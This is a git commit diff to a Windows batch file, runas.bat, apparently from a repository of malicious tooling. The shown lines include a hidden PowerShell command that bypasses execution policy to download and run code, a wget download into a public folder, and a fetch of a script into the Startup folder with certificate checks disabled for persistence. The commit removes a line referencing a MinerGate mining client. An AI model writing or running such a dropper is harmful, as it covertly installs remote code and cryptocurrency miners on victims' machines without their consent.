d352bb1f9ccb389b89d269cdb8245b619577aa83
mediatui <57651467+mediatui@users.noreply.github.com>
2019-12-02 15:24:49 +1300

    Update runas.bat

--- multi/runas.bat
+++ multi/runas.bat
@@ -2,6 +2,5 @@ cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.
 setx wget "C:\Users\Public\wget.exe"
 setx startup "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 C:\Users\Public\wget.exe -q https://raw.githubusercontent.com/mediatui/tool/master/multi/runonboot.cmd --no-check-certificate -O "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runonboot.cmd"
-setx xfast "%TMP%\minergate-cli.exe"
 cls
 exit
